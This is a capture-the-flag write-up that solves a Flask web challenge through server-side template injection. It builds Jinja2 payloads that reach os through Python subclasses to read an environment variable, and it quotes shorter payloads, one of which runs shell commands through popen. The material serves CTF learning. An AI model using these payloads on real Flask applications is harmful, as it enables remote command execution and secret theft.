# Username Decorator
## Description
Author: JW/Mani

My favorite social media platform, Prorope, has overhauled their username system and now supports prefixes and suffixes! Isn't that so cool?

For one, I know that I would really love to be the !! JW !!, so I made a website to preview these username changes.

Note: the flag is in an environment variable called FLAG

## Resources
web3.zip  
## Solution
> basic knowledge: we can use `{{ }}` in flask template to eval python code (but without any builtin function and variable beside config, url ... etc provided by flask).  

According to the solution of `Bonus: The Revenge of Checkpass 1`, the first thing pop in my mind is use `().__class__.__bases__[0].__subclasses__()` to access OS and then get the env. So, basically, my goal is to make a payload like this:   
```python
{{ ().__class__.__bases__[0].__subclasses__()[INDEX]().load_module("os").getenv("FLAG") }}
```  
So, here is what I get:  
```
().__class__.__bases__[0].__subclasses__()[107]() = <class '_frozen_importlib.BuiltinImporter'>
().__class__.__bases__[0].__subclasses__()[41](config.values())[-1] = os.getenv("FLAG")
```  
Because we can't put `"` or `'` in input(limited by this re formula `re.fullmatch("[a-zA-Z0-9._\[\]\(\)\-=,]{2,}", username)`), so:  
```
().__class__.__bases__[0].__subclasses__()[41](config.values())[-1].split(().__class__.__bases__[0].__subclasses__()[41](config.values())[-1][2])[0] = os
().__class__.__bases__[0].__subclasses__()[41](config.values())[-1].split(().__class__.__bases__[0].__subclasses__()[41](config.values())[-1][-7])[1].split(().__class__.__bases__[0].__subclasses__()[41](config.values())[-1][-2])[0] = FLAG
```  
Therefore, final payload: `().__class__.__bases__[0].__subclasses__()[107]().load_module(().__class__.__bases__[0].__subclasses__()[41](config.values())[-1].split(().__class__.__bases__[0].__subclasses__()[41](config.values())[-1][2])[0]).getenv(().__class__.__bases__[0].__subclasses__()[41](config.values())[-1].split(().__class__.__bases__[0].__subclasses__()[41](config.values())[-1][-7])[1].split(().__class__.__bases__[0].__subclasses__()[41](config.values())[-1][-2])[0])` for username.  
`{{` and `}}` for prefix and postfix.  

> There are some other very smart and short payloads:  
> `url_for.__globals__.os.environ` by JW  
> `url_for.__globals__.os.__dict__.popen(request.args.file).read()` by daffainfo  
> `config.__class__.from_envvar.__globals__.__builtins__.__import__(request.args.a).getenv(request.args.b)` with two args os and FLAG, by Chris P. Bacon
